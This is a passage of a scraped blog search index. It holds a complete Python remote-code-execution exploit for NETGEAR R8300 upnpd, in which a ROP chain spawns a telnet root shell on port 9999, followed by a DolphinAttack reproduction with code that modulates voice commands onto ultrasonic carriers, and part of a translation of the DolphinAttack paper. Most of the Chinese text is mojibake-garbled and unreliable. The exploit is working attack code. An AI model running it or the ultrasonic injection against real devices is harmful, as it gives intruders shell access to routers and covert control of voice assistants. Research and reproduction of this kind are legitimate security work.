ã€ä»»æ„libcæœ‰æ•ˆåœ°å€ã€‘ çœŸå®åˆ©ç”¨ï¼š IP:192.168.2.2 Port:upnp/1900 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212import socketimport timeimport sysfrom struct import packp32 = lambda x: pack(&quot;&lt;L&quot;, x)bssBase = 0x9E150 #string bss BASE Addressip = &apos;192.168.2.2&apos;libc_addr = 0x76d9d450def banner(): a= &quot;&quot;&quot; # NETGEAR Nighthawk R8300 RCE Exploit upnpd, tested exploit fw version V1.0.2.130 # Date : 2020.03.09 # POC : system(&quot;telnetd -l /bin/sh -p 9999&amp; &quot;) Execute # Desc : execute telnetd to access router &quot;&quot;&quot; print adef makpayload2(libc_addr): payload = ( 0x604 * b&apos;a&apos; + # dummy p32(int(libc_addr,16)) + # v51 Need to Existed Address (0x634 - 0x604 - 8) * b&apos;a&apos; + # dummy p32(0x000230f0) + # #change eip LR=0x000230f0 2509 * b&apos;a&apos; &quot;&quot;&quot; .text:000230F0 ADD SP, SP, #0x20C .text:000230F4 ADD SP, SP, #0x1000 .text:000230F8 LDMFD SP!, &#123;R4-R11,PC&#125; &quot;&quot;&quot; ) print(len(payload)) return payloaddef makpayload1(): expayload = &apos;&apos; &quot;&quot;&quot; .text:00013644 MOV R0, R10 ; dest .text:00013648 MOV R1, R5 ; src .text:0001364C BL strcpy .text:00013650 MOV R0, R4 .text:00013654 ADD SP, SP, #0x5C ; &apos;\\&apos; .text:00013658 LDMFD SP!, &#123;R4-R8,R10,PC&#125; &quot;&quot;&quot; expayload += &apos;a&apos; * 4550 expayload += p32(bssBase+3) # R4 Register expayload += p32(0x3F340) # R5 Register //tel expayload += &apos;IIII&apos; # R6 Register expayload += &apos;HHHH&apos; # R7 Register expayload += &apos;GGGG&apos; # R8 Register expayload += &apos;FFFF&apos; # R9 Register expayload += p32(bssBase) # R10 Register expayload += &apos;BBBB&apos; # R11 Register expayload += p32(0x13644) # strcpy expayload += &apos;d&apos;*0x5c#dummy expayload += p32(bssBase+6) #R4 expayload += p32(0x423D7) #R5 //telnet expayload += &apos;c&apos;*4 #R6 expayload += &apos;c&apos;*4 #R7 expayload += &apos;c&apos;*4 #R8 expayload += &apos;d&apos;*4 #R10 expayload += p32(0x13648) #strcpy expayload += &apos;d&apos;*0x5c#dummy expayload += p32(bssBase+8) #R4 expayload += p32(0x40CA4 ) #R5 //telnetd\\x20 expayload += &apos;c&apos;*4 #R6 expayload += &apos;c&apos;*4 #R7 expayload += &apos;c&apos;*4 #R8 expayload += &apos;d&apos;*4 #R10 expayload += p32(0x13648) #strcpy expayload += &apos;d&apos;*0x5c#dummy expayload += p32(bssBase+10) #R4 expayload += p32(0x4704A) #R5 //telnetd\\x20-l expayload += &apos;c&apos;*4 #R6 expayload += &apos;c&apos;*4 #R7 expayload += &apos;c&apos;*4 #R8 expayload += &apos;d&apos;*4 #R10 expayload += p32(0x13648) #strcpy expayload += &apos;d&apos;*0x5c#dummy expayload += p32(bssBase+11) #R4 expayload += p32(0x04C281) #R5 //telnetd\\x20-l/bin/\\x20 expayload += &apos;c&apos;*4 #R6 expayload += &apos;c&apos;*4 #R7 expayload += &apos;c&apos;*4 #R8 expayload += &apos;d&apos;*4 #R10 expayload += p32(0x13648) #strcpy expayload += &apos;d&apos;*0x5c#dummy expayload += p32(bssBase+16) #R4 expayload += p32(0x40CEC) #R5 //telnetd\\x20-l/bin/ expayload += &apos;c&apos;*4 #R6 expayload += &apos;c&apos;*4 #R7 expayload += &apos;c&apos;*4 #R8 expayload += &apos;d&apos;*4 #R10 expayload += p32(0x13648) #strcpy expayload += &apos;d&apos;*0x5c#dummy expayload += p32(bssBase+18) #R4 expayload += p32(0x9CB5) #R5 //telnetd\\x20-l/bin/sh expayload += &apos;c&apos;*4 #R6 expayload += &apos;c&apos;*4 #R7 expayload += &apos;c&apos;*4 #R8 expayload += &apos;d&apos;*4 #R10 expayload += p32(0x13648) #strcpy expayload += &apos;d&apos;*0x5c#dummy expayload += p32(bssBase+22) #R4 expayload += p32(0x41B17) #R5 //telnetd\\x20-l/bin/sh\\x20-p\\x20 expayload += &apos;c&apos;*4 #R6 expayload += &apos;c&apos;*4 #R7 expayload += &apos;c&apos;*4 #R8 expayload += &apos;d&apos;*4 #R10 expayload += p32(0x13648) #strcpy expayload += &apos;d&apos;*0x5c#dummy expayload += p32(bssBase+24) #R4 expayload += p32(0x03FFC4) #R5 //telnetd\\x20-l/bin/sh\\x20-p\\x2099 expayload += &apos;c&apos;*4 #R6 expayload += &apos;c&apos;*4 #R7 expayload += &apos;c&apos;*4 #R8 expayload += &apos;d&apos;*4 #R10 expayload += p32(0x13648) #strcpy expayload += &apos;d&apos;*0x5c#dummy expayload += p32(bssBase+26) #R4 expayload += p32(0x03FFC4) #R5 //telnetd\\x20-l/bin/sh\\x20-p\\x209999 expayload += &apos;c&apos;*4 #R6 expayload += &apos;c&apos;*4 #R7 expayload += &apos;c&apos;*4 #R8 expayload += &apos;d&apos;*4 #R10 expayload += p32(0x13648) #strcpy expayload += &apos;d&apos;*0x5c#dummy expayload += p32(bssBase+28) #R4 expayload += p32(0x4A01D) #R5 //telnetd\\x20-l/bin/sh\\x20-p\\x209999\\x20&amp; expayload += &apos;c&apos;*4 #R6 expayload += &apos;c&apos;*4 #R7 expayload += &apos;c&apos;*4 #R8 expayload += &apos;d&apos;*4 #R10 expayload += p32(0x13648) #strcpy expayload += &apos;d&apos;*0x5c#dummy expayload += p32(bssBase+30) #R4 expayload += p32(0x461C1) #R5 //telnetd\\x20-l/bin/sh\\x20-p\\x209999\\x20&amp;\\x20\\x00 expayload += &apos;c&apos;*4 #R6 expayload += &apos;c&apos;*4 #R7 expayload += &apos;c&apos;*4 #R8 expayload += &apos;d&apos;*4 #R10 expayload += p32(0x13648) #strcpy print &quot;[*] Make Payload ...&quot; &quot;&quot;&quot; .text:0001A83C MOV R0, R4 ; command .text:0001A840 BL system &quot;&quot;&quot; expayload += &apos;d&apos;*0x5c#dummy expayload += p32(bssBase) #R4 expayload += p32(0x47398) #R5 expayload += &apos;c&apos;*4 #R6 expayload += &apos;c&apos;*4 #R7 expayload += &apos;c&apos;*4 #R8 expayload += &apos;d&apos;*4 #R10 expayload += p32(0x1A83C) #system(string) telnetd -l return expayloaddef conn(ip): s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) s.connect((ip, 1900)) return s print &quot;[*] Send Proof Of Concept payload&quot;def checkExploit(ip): soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: ret = soc.connect((ip,9999)) return 1 except: return 0if __name__==&quot;__main__&quot;: ip = sys.argv[1] libc_addr = sys.argv[2] banner() payload1 = makpayload1() payload2 = makpayload2(libc_addr) s = conn(ip) s.send(&apos;a\\x00&apos;+payload1) #expayload is rop gadget s.send(payload2) time.sleep(5) if checkExploit(ip): print &quot;[*] Exploit Success&quot; print &quot;[*] You can access telnet %s 9999&quot;%ip else: print &quot;[*] Need to Existed Address cross each other&quot; print &quot;[*] You need to reboot or execute upnpd daemon to execute upnpd&quot; print &quot;[*] To exploit reexecute upnpd, description&quot; print &quot;[*] Access http://%s/debug.htm and enable telnet&quot;%ip print &quot;[*] then, You can access telnet. execute upnpd(just typing upnpd)&quot; s.close() print &quot;&quot;&quot;\\n[*] Done ...\\n&quot;&quot;&quot;","categories":[{"name":"IOT","slug":"IOT","permalink":"https://cool-y.github.io/categories/IOT/"}],"tags":[{"name":"UPnP","slug":"UPnP","permalink":"https://cool-y.github.io/tags/UPnP/"},{"name":"å›ºä»¶æ¨¡æ‹Ÿ","slug":"å›ºä»¶æ¨¡æ‹Ÿ","permalink":"https://cool-y.github.io/tags/å›ºä»¶æ¨¡æ‹Ÿ/"},{"name":"Netgear","slug":"Netgear","permalink":"https://cool-y.github.io/tags/Netgear/"}]},{"title":"Dolphin Attack è®ºæ–‡å¤ç°","slug":"dolphin-attack-practice","date":"2021-01-08T04:54:41.000Z","updated":"2021-04-10T13:41:53.589Z","comments":true,"path":"2021/01/08/dolphin-attack-practice/","link":"","permalink":"https://cool-y.github.io/2021/01/08/dolphin-attack-practice/","excerpt":"","text":"æµ·è±šéŸ³æ”»å‡»-å¤ç°æ–‡ç« ä¸­æåˆ°ä¸¤ç§æ–¹æ¡ˆï¼Œä¸€æ˜¯å…·æœ‰ä¿¡å·å‘ç”Ÿå™¨çš„å¼ºå¤§å˜é€å™¨ï¼ŒäºŒæ˜¯å¸¦æœ‰æ™ºèƒ½æ‰‹æœºçš„ä¾¿æºå¼å˜é€å™¨ï¼›å‰ä¸€ç§æ–¹æ¡ˆæˆæœ¬è¿‡äºé«˜ï¼Œæœ¬æ–‡ä¸åšåˆ†æï¼Œåä¸€ç§æ–¹æ¡ˆçš„å®ç°æˆæœ¬åœ¨æˆ‘ä»¬å¯æ¥æ”¶çš„èŒƒå›´ã€‚ä½†åŸæ–‡ä¸­å¯¹åä¸€æ–¹æ¡ˆçš„å®ç°æ²¡æœ‰å¤ªå¤šä»‹ç»ï¼Œäºæ˜¯æˆ‘é€šè¿‡é‚®ä»¶å’¨è¯¢äº†ä½œè€…-é—«ç›åšå£«ï¼Œé—«åšå£«éå¸¸å‹å¥½ï¼Œæˆ‘æ˜¯åœ¨æ™šä¸Šåç‚¹å‘é€çš„ç¬¬ä¸€å°é‚®ä»¶ï¼Œå·®ä¸å¤šåœ¨ååˆ†é’Ÿå†…é€šè¿‡å‡ å°é‚®ä»¶çš„äº¤æµï¼Œè§£å†³äº†æˆ‘çš„é—®é¢˜ï¼Œå¾ˆå¿«ç¡®å®šäº†æˆ‘çš„å…·ä½“å®ç°è·¯å¾„ï¼Œéå¸¸æ„Ÿè°¢å¤§ä½¬ï¼ Q: ä½¿ç”¨ä¾¿æºå¼è®¾å¤‡æ”»å‡»çš„æ—¶å€™ï¼Œä¸‰æ˜ŸGalaxy S6 Edgeå‘é€çš„é«˜é¢‘å£°éŸ³ä¿¡å·æ˜¯æ€ä¹ˆç”Ÿæˆçš„å‘¢ï¼Ÿæ˜¯é¢„å…ˆä½¿ç”¨ä¸“ä¸šè®¾å¤‡è°ƒåˆ¶å¥½çš„ä¿¡å·ä¿å­˜ä¸ºmp3å—ï¼Ÿ A: é€šè¿‡è½¯ä»¶è°ƒåˆ¶ï¼Œç”Ÿæˆ.wavçš„è¶…å£°æ³¢éŸ³é¢‘æ–‡ä»¶ï¼Œå†é€šè¿‡ä¸‰æ˜Ÿæ‰‹æœºæ’­æ”¾çš„ã€‚ Q: ç”¨çš„æ˜¯ä»€ä¹ˆè½¯ä»¶è¿›è¡Œè°ƒåˆ¶? A: ç”¨è¿‡matlabå’Œpythonï¼Œéƒ½æ˜¯å¯ä»¥çš„ 0x01 è¯­éŸ³å‘½ä»¤ç”Ÿæˆhttps://ttstool.com/å¾®è½¯çš„TTSæ¥å£ç”Ÿæˆçš„æ˜¯mp3æ ¼å¼éŸ³é¢‘ï¼Œä¸€èˆ¬æ¥è¯´æˆ‘ä»¬ä½¿ç”¨pythonå¤„ç†éŸ³é¢‘éƒ½æ˜¯é’ˆå¯¹wavæ ¼å¼ã€‚https://www.aconvert.com/cn/audio/mp3-to-wav/æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªç½‘ç«™å¯¹æ ¼å¼åšè½¬æ¢ã€‚xiaoyi.wavè¿™ä¸ªç½‘ç«™çš„é‡‡æ ·ç‡æœ€é«˜åªèƒ½è¾¾åˆ°96000hz6wxmu-crusr.wav 0x02 è¯­éŸ³å‘½ä»¤è°ƒåˆ¶ç”Ÿæˆè¯­éŸ³å‘½ä»¤çš„åŸºå¸¦ä¿¡å·åï¼Œæˆ‘ä»¬éœ€è¦åœ¨è¶…å£°è½½æ³¢ä¸Šå¯¹å…¶è¿›è¡Œè°ƒåˆ¶ï¼Œä»¥ä½¿å®ƒä»¬å¬ä¸åˆ°ã€‚ ä¸ºäº†åˆ©ç”¨éº¦å…‹é£çš„éçº¿æ€§ï¼ŒDolphinAttackå¿…é¡»åˆ©ç”¨å¹…åº¦è°ƒåˆ¶ï¼ˆAMï¼‰ã€‚ AMè°ƒåˆ¶åŸç†ä½¿è½½æ³¢çš„æŒ¯å¹…æŒ‰ç…§æ‰€éœ€ä¼ é€ä¿¡å·çš„å˜åŒ–è§„å¾‹è€Œå˜åŒ–ï¼Œä½†é¢‘ç‡ä¿æŒä¸å˜çš„è°ƒåˆ¶æ–¹æ³•ã€‚è°ƒå¹…åœ¨æœ‰çº¿ç”µæˆ–æ— çº¿ç”µé€šä¿¡å’Œå¹¿æ’­ä¸­åº”ç”¨ç”šå¹¿ã€‚è°ƒå¹…æ˜¯é«˜é¢‘è½½æ³¢çš„æŒ¯å¹…éšä¿¡å·æ”¹å˜çš„è°ƒåˆ¶ï¼ˆAMï¼‰ã€‚å…¶ä¸­ï¼Œè½½æ³¢ä¿¡å·çš„æŒ¯å¹…éšç€è°ƒåˆ¶ä¿¡å·çš„æŸç§ç‰¹å¾çš„å˜æ¢è€Œå˜åŒ–ã€‚ä¾‹å¦‚ï¼Œ0æˆ–1åˆ†åˆ«å¯¹åº”äºæ— è½½æ³¢æˆ–æœ‰è½½æ³¢è¾“å‡ºï¼Œç”µè§†çš„å›¾åƒä¿¡å·ä½¿ç”¨è°ƒå¹…ã€‚è°ƒé¢‘çš„æŠ—å¹²æ‰°èƒ½åŠ›å¼ºï¼Œå¤±çœŸå°ï¼Œä½†æœåŠ¡åŠå¾„å°ã€‚å‡è®¾è½½æ³¢uc(t)å’Œè°ƒåˆ¶ä¿¡å·çš„é¢‘ç‡åˆ†åˆ«ä¸ºÏ‰cå’ŒÎ©ï¼Œåœ¨å·²è°ƒæ³¢ä¸­åŒ…å«ä¸‰ä¸ªé¢‘ç‡æˆåˆ†ï¼šÏ‰cã€Ï‰c+Î©å’ŒÏ‰c-Î©ã€‚Ï‰c+Î©ç§°ä¸ºä¸Šè¾¹é¢‘ï¼ŒÏ‰c-Î©ç§°ä¸ºä¸‹è¾¹é¢‘ã€‚ https://epxx.co/artigos/ammodulation.htmlhttp://www.chenjianqu.com/show-44.htmlhttps://zhuanlan.zhihu.com/p/54561504http://www.mwhitelab.com/archives/208 ä½¿ç”¨pythonè°ƒåˆ¶ç°åœ¨æˆ‘ä»¬å·²ç»æœ‰äº†åŸºå¸¦ä¿¡å·ï¼Œä½¿ç”¨Audacityå¯¹å…¶è¿›è¡Œé¢‘è°±åˆ†æï¼Œæ­¤è¯­éŸ³çš„å¸¦å®½æˆ–é¢‘è°±ï¼ˆå·¦å›¾ä¸ºé‡‡æ ·é¢‘ç‡48khzéŸ³é¢‘ï¼Œå³å›¾ä¸º96khzï¼‰ ï¼š æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¸¦å®½ä¸º8000-9000hzå·¦å³ï¼Œè¿™æ˜¯å¥³å£°ï¼Œå› æ­¤é¢‘å¸¦èŒƒå›´è¾ƒå®½ã€‚è¿™å¯èƒ½å¯¼è‡´å¯å¬èŒƒå›´å†…çš„é¢‘ç‡æ³„éœ²ï¼Œä½†è¿™é‡Œæˆ‘ä»¬å…ˆä¸å»è®¨è®ºï¼Œä¹‹åå†ä½¿ç”¨å¸¦å®½è¾ƒå°çš„è¯­éŸ³ä»¥åˆ›å»ºåŸºå¸¦è¯­éŸ³ä¿¡å·ã€‚waveåŒ…æœ€å¤šèƒ½è¯»å–çš„wavéŸ³é¢‘é‡‡æ ·ç‡ä¸º48khzï¼Œå½“è¶…è¿‡è¿™ä¸ªå€¼æ—¶ï¼Œwaveå°±ä¸å†æ”¯æŒï¼ˆwave.Error: unknown format: 65534ï¼‰ã€‚ä½†æˆ‘ä»¬çš„è½½æ³¢é¢‘ç‡ä¸º30khzå·¦å³ï¼Œè¿™å°±è¦æ±‚éŸ³é¢‘æ–‡ä»¶çš„é‡‡æ ·ç‡é«˜äº60khzæ‰èƒ½ä¿è¯ä¸å¤±çœŸã€‚æ‰€å¹¸scipy.io.wavfileæ”¯æŒé«˜äº48khzçš„wavæ–‡ä»¶è¯»å–ã€‚ä½¿ç”¨ä»¥ä¸‹Pythonç¨‹åºæ¥ç”Ÿæˆè°ƒåˆ¶çš„AMå’ŒAM-SCéŸ³é¢‘ï¼ŒAMæ˜¯å¹¿æ’­æ— çº¿ç”µè°ƒåˆ¶çš„â€œæ­£å¸¸â€å£°éŸ³ï¼Œå®ƒåŠ ä¸Šäº†è½½æ³¢ï¼›AM-SCåˆ™åªæ˜¯è½½æ³¢ä¸åŸå§‹ä¿¡å·çš„ä¹˜ç§¯ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738# coding=utf-8import numpy as npimport matplotlib.pyplot as pltimport osimport waveimport structimport mathfrom pydub import AudioSegmentimport scipy.io.wavfiledef main(): test = scipy.io.wavfile.read(\"xiaoyi.wav\") nframes = len(test[1]) waveData = np.fromstring(test[1],dtype=np.short)#å°†åŸå§‹å­—ç¬¦æ•°æ®è½¬æ¢ä¸ºæ•´æ•° #éŸ³é¢‘æ•°æ®å½’ä¸€åŒ– maxW = max(abs(waveData)) waveData = waveData * 1.0/maxW #å°†éŸ³é¢‘ä¿¡å·è§„æ•´ä¹˜æ¯è¡Œä¸€è·¯é€šé“ä¿¡å·çš„æ ¼å¼ï¼Œå³è¯¥çŸ©é˜µä¸€è¡Œä¸ºä¸€ä¸ªé€šé“çš„é‡‡æ ·ç‚¹ï¼Œå…±nchannelsè¡Œ Tdata = np.reshape(waveData,[nframes,1]).T # .T è¡¨ç¤ºè½¬ç½® am = wave.open(\"am.wav\", \"w\") amsc = wave.open(\"amsc.wav\", \"w\") carrier = wave.open(\"carrier3000.wav\", \"w\") for f in [am,amsc,carrier]: f.setnchannels(1) f.setsampwidth(2) f.setframerate(96000) for n in range(0, nframes): carrier_sample = math.cos(30000.0 * (n / 96000.0) * math.pi * 2) signal_am = signal_amsc= waveData[n] * carrier_sample signal_am += carrier_sample signal_am /= 2 am.writeframes(struct.pack('h', signal_am * maxW)) amsc.writeframes(struct.pack('h', signal_amsc * maxW)) carrier.writeframes(struct.pack('h', carrier_sample * maxW))if __name__=='__main__': main() åˆ†åˆ«å¯¹am.wavã€amsc.wavã€carrier3000.wavåšé¢‘è°±åˆ†æcarrier3000.wavçš„é¢‘è°±çš„ä¸ºé›†ä¸­åœ¨è½½æ³¢é¢‘ç‡30khzä¸Šçš„ä¸€ä¸ªè„‰å†²carrier3000.wavamsc.wavçš„å¸¦å®½çº¦ä¸º18khzï¼Œæ˜¯åŸæ¥çš„ä¸¤å€ï¼Œå…³äºf=30khzé•œé¢å¯¹ç§°ã€‚AMè°ƒåˆ¶ä¼šåˆ›å»ºåŸå§‹ä¿¡å·çš„ä¸¤ä¸ªâ€œå‰¯æœ¬â€ï¼Œä¸€ä¸ªåœ¨21-30kHzé¢‘æ®µï¼Œå¦ä¸€ä¸ªåœ¨30-39kHzã€‚ am.wavï¼Œåœ¨è¿™ç§è°ƒåˆ¶ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å¬åˆ°è½½æ³¢ï¼Œè€Œåœ¨AM-SCä¸­åˆ™å¬ä¸åˆ°ã€‚é¢‘è°±ç±»ä¼¼äºAM-SCï¼Œä½†åœ¨è½½æ³¢é¢‘ç‡ä¸Šè¿˜æœ‰ä¸€ä¸ªå°–é”çš„â€œå°–å³°â€ï¼š 0x03 è¯­éŸ³å‘½ä»¤å‘é€å™¨ä¸‹å›¾æ˜¯ç”±æ™ºèƒ½æ‰‹æœºé©±åŠ¨çš„ä¾¿æºå¼å‘å°„å™¨ã€‚ä¾¿æºå¼å‘å°„å™¨åˆ©ç”¨æ™ºèƒ½æ‰‹æœºæ¥å‘å°„è°ƒåˆ¶ä¿¡å·ã€‚è®¸å¤šè®¾å¤‡çš„æœ€ä½³è½½æ³¢é¢‘ç‡éƒ½å¤§äº24 kHzï¼Œ å¤§å¤šæ•°æ™ºèƒ½æ‰‹æœºæ— æ³•å®Œæˆä»»åŠ¡ã€‚å¤§å¤šæ•°æ™ºèƒ½æ‰‹æœºæœ€å¤šæ”¯æŒ48 kHzé‡‡æ ·ç‡ï¼Œæ‰€ä»¥åªèƒ½å‘é€è½½æ³¢é¢‘ç‡æœ€é«˜ä¸º24 kHzçš„è°ƒåˆ¶çª„å¸¦ä¿¡å·ã€‚éœ€è¦æ”¯æŒé«˜è¾¾192 kHzçš„é‡‡æ ·ç‡çš„æ‰‹æœºï¼Œè€Œä¸”æ‰¬å£°å™¨ä¼šè¡°å‡é¢‘ç‡å¤§äº20 kHzçš„ä¿¡å·ã€‚ä¸ºäº†å‡è½»è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä½¿ç”¨çª„å¸¦è¶…å£°æ¢èƒ½å™¨ä½œä¸ºæ‰¬å£°å™¨ï¼Œå¹¶åœ¨è¶…å£°æ¢èƒ½å™¨ä¹‹å‰æ·»åŠ äº†ä¸€ä¸ªæ”¾å¤§å™¨ï¼Œè¿™æ ·æœ‰æ•ˆçš„æ”»å‡»èŒƒå›´å¾—ä»¥æ‰©å±•ã€‚","categories":[{"name":"é¡¶ä¼šè®ºæ–‡","slug":"é¡¶ä¼šè®ºæ–‡","permalink":"https://cool-y.github.io/categories/é¡¶ä¼šè®ºæ–‡/"}],"tags":[{"name":"ç¡¬ä»¶æ”»å‡»","slug":"ç¡¬ä»¶æ”»å‡»","permalink":"https://cool-y.github.io/tags/ç¡¬ä»¶æ”»å‡»/"},{"name":"ä¼ æ„Ÿå™¨","slug":"ä¼ æ„Ÿå™¨","permalink":"https://cool-y.github.io/tags/ä¼ æ„Ÿå™¨/"},{"name":"è¯­éŸ³åŠ©æ‰‹","slug":"è¯­éŸ³åŠ©æ‰‹","permalink":"https://cool-y.github.io/tags/è¯­éŸ³åŠ©æ‰‹/"}]},{"title":"Dolphin Attack è®ºæ–‡ç¿»è¯‘","slug":"Dolphin-Attack","date":"2021-01-08T03:58:55.000Z","updated":"2021-04-10T13:42:46.870Z","comments":true,"path":"2021/01/08/Dolphin-Attack/","link":"","permalink":"https://cool-y.github.io/2021/01/08/Dolphin-Attack/","excerpt":"","text":"æµ·è±šéŸ³æ”»å‡»https://acmccs.github.io/papers/p103-zhangAemb.pdfhttps://github.com/USSLab/DolphinAttackhttps://zhuanlan.zhihu.com/p/29306026 Abstractè¯¸å¦‚Siriæˆ–Google Nowä¹‹ç±»çš„è¯­éŸ³è¯†åˆ«ï¼ˆSRï¼‰ç³»ç»Ÿå·²ç»æˆä¸ºä¸€ç§è¶Šæ¥è¶Šæµè¡Œçš„äººæœºäº¤äº’æ–¹æ³•ï¼Œå¹¶å°†å„ç§ç³»ç»Ÿè½¬å˜ä¸ºè¯­éŸ³å¯æ§ç³»ç»Ÿï¼ˆVCSï¼‰ã€‚å…ˆå‰å¯¹VCSè¿›è¡Œæ”»å‡»çš„å·¥ä½œè¡¨æ˜ï¼Œäººä»¬æ— æ³•ç†è§£çš„éšè—è¯­éŸ³å‘½ä»¤å¯ä»¥æ§åˆ¶ç³»ç»Ÿã€‚éšè—çš„è¯­éŸ³å‘½ä»¤å°½ç®¡æ˜¯â€œéšè—çš„â€ï¼Œä½†è¿˜æ˜¯å¯ä»¥å¬åˆ°çš„ã€‚åœ¨è¿™é¡¹å·¥ä½œä¸­ï¼Œæˆ‘ä»¬è®¾è®¡äº†ä¸€ä¸ªå®Œå…¨å¬ä¸è§çš„æ”»å‡»DolphinAttackï¼Œå®ƒå¯ä»¥è°ƒåˆ¶è¶…å£°è½½æ³¢ä¸Šçš„è¯­éŸ³å‘½ä»¤ï¼ˆä¾‹å¦‚f&gt; 20 kHzï¼‰ï¼Œä»¥å®ç°å¬ä¸æ¸…ã€‚é€šè¿‡åˆ©ç”¨éº¦å…‹é£ç”µè·¯çš„éçº¿æ€§ç‰¹æ€§ï¼Œè¯­éŸ³è¯†åˆ«ç³»ç»Ÿå¯ä»¥æˆåŠŸåœ°è§£è°ƒï¼Œæ¢å¤è°ƒåˆ¶çš„ä½é¢‘éŸ³é¢‘å‘½ä»¤ï¼Œå¹¶å¯¹å…¶è¿›è¡Œæ›´é‡è¦çš„è§£é‡Šã€‚æˆ‘ä»¬åœ¨æµè¡Œçš„è¯­éŸ³è¯†åˆ«ç³»ç»Ÿä¸ŠéªŒè¯äº†DolphinAttackï¼ŒåŒ…æ‹¬Siriï¼ŒGoogle Nowï¼Œä¸‰æ˜ŸS Voiceï¼Œåä¸ºHiVoiceï¼ŒCortanaå’ŒAlexaã€‚é€šè¿‡æ³¨å…¥ä¸€ç³»åˆ—å¬ä¸è§çš„è¯­éŸ³å‘½ä»¤ï¼Œæˆ‘ä»¬å±•ç¤ºäº†ä¸€äº›æ¦‚å¿µéªŒè¯æ”»å‡»ï¼ŒåŒ…æ‹¬æ¿€æ´»Siriä»¥åœ¨iPhoneä¸Šå‘èµ·FaceTimeé€šè¯ï¼Œæ¿€æ´»Google Nowä»¥å°†æ‰‹æœºåˆ‡æ¢ä¸ºé£è¡Œæ¨¡å¼ï¼Œç”šè‡³æ“çºµå¯¼èˆªç³»ç»Ÿåœ¨å¥¥è¿ªæ±½è½¦ä¸Šã€‚æˆ‘ä»¬æå‡ºäº†ç¡¬ä»¶å’Œè½¯ä»¶é˜²å¾¡è§£å†³æ–¹æ¡ˆã€‚æˆ‘ä»¬éªŒè¯é€šè¿‡ä½¿ç”¨æ”¯æŒå‘é‡æœºï¼ˆSVMï¼‰å¯¹éŸ³é¢‘è¿›è¡Œåˆ†ç±»æ¥æ£€æµ‹DolphinAttackæ˜¯å¯è¡Œçš„ï¼Œå¹¶å»ºè®®é‡æ–°è®¾è®¡è¯­éŸ³å¯æ§ç³»ç»Ÿï¼Œä»¥åº”å¯¹å¬ä¸è§çš„è¯­éŸ³å‘½ä»¤æ”»å‡»ã€‚ å…³é”®å­—ï¼šè¯­éŸ³å¯æ§ç³»ç»Ÿï¼Œè¯­éŸ³è¯†åˆ«ï¼ŒMEMSéº¦å…‹é£ï¼Œå®‰å…¨åˆ†æï¼Œé˜²å¾¡ 1 Introductionè¯­éŸ³è¯†åˆ«ï¼ˆSRï¼‰æŠ€æœ¯å…è®¸æœºå™¨æˆ–ç¨‹åºè¯†åˆ«å£è¯­å•è¯å¹¶å°†å…¶è½¬æ¢ä¸ºæœºå™¨å¯è¯»æ ¼å¼ã€‚ ç”±äºå®ƒçš„å¯è®¿é—®æ€§ï¼Œæ•ˆç‡ä»¥åŠæœ€è¿‘åœ¨è¯†åˆ«ç²¾åº¦æ–¹é¢çš„è¿›æ­¥ï¼Œå®ƒå·²æˆä¸ºè¶Šæ¥è¶Šæµè¡Œçš„äººæœºäº¤äº’æœºåˆ¶ã€‚ ç»“æœï¼Œè¯­éŸ³è¯†åˆ«ç³»ç»Ÿå·²å°†å„ç§å„æ ·çš„ç³»ç»Ÿå˜æˆè¯­éŸ³å¯æ§ç³»ç»Ÿï¼ˆVCSï¼‰ï¼šApple Siri [5]å’ŒGoogle Now [21]å…è®¸ç”¨æˆ·é€šè¿‡è¯­éŸ³å‘èµ·ç”µè¯å‘¼å«ï¼› Alexa [4]å·²ä½¿ç”¨æˆ·èƒ½å¤ŸæŒ‡ç¤ºAmazon Echoè®¢è´­å¤–å–ï¼Œå®‰æ’Uberéª‘è¡Œç­‰ã€‚éšç€ç ”ç©¶äººå‘˜å°†å¤§é‡ç²¾åŠ›æŠ•å…¥åˆ°æ”¹å–„SRç³»ç»Ÿçš„æ€§èƒ½ä¸Šï¼Œäººä»¬å¯¹è¯­éŸ³è¯†åˆ«å’Œè¯­éŸ³çš„äº†è§£ç¨‹åº¦å´é²œä¸ºäººçŸ¥ã€‚ å¯æ§ç³»ç»Ÿåœ¨æ•…æ„å’Œå·å·æ‘¸æ‘¸çš„æ”»å‡»ä¸‹è¡¨ç°è‰¯å¥½ã€‚å…ˆå‰çš„å·¥ä½œ[10ã€61]å·²ç»è¡¨æ˜ï¼ŒSRç³»ç»Ÿå¯ä»¥ç†è§£äººç±»éš¾ä»¥ç†è§£çš„æ··æ·†è¯­éŸ³å‘½ä»¤ï¼Œå› æ­¤å¯ä»¥æ§åˆ¶ç³»ç»Ÿè€Œä¸ä¼šè¢«æ£€æµ‹åˆ°ã€‚ è¿™äº›è¯­éŸ³å‘½ä»¤è™½ç„¶æ˜¯â€œéšè—çš„â€ï¼Œä½†ä»ç„¶å¯ä»¥å¬è§å¹¶ä¸”ä»ç„¶å¾ˆæ˜æ˜¾ã€‚ æœ¬æ–‡æ—¨åœ¨ç ”ç©¶éš¾ä»¥æ£€æµ‹åˆ°çš„æ”»å‡»çš„å¯è¡Œæ€§ï¼Œå¹¶ä¸”æœ¬æ–‡å—åˆ°ä»¥ä¸‹å…³é”®é—®é¢˜çš„é©±åŠ¨ï¼šè¯­éŸ³å‘½ä»¤æ˜¯å¦å¯ä»¥è¢«äººå¬ä¸è§ï¼Œè€Œä»ç„¶å¯ä»¥è¢«è®¾å¤‡å¬è§ï¼Œå¹¶ä¸”å¯ä»¥è¢«è¯­éŸ³è¯†åˆ«ç³»ç»Ÿç†è§£ï¼Ÿ æ³¨å…¥ä¸€ç³»åˆ—å¬ä¸è§çš„è¯­éŸ³å‘½ä»¤æ˜¯å¦ä¼šå¯¼è‡´è¯­éŸ³å¯æ§ç³»ç»Ÿå‡ºç°æœªæ³¨æ„åˆ°çš„å®‰å…¨æ¼æ´ï¼Ÿ 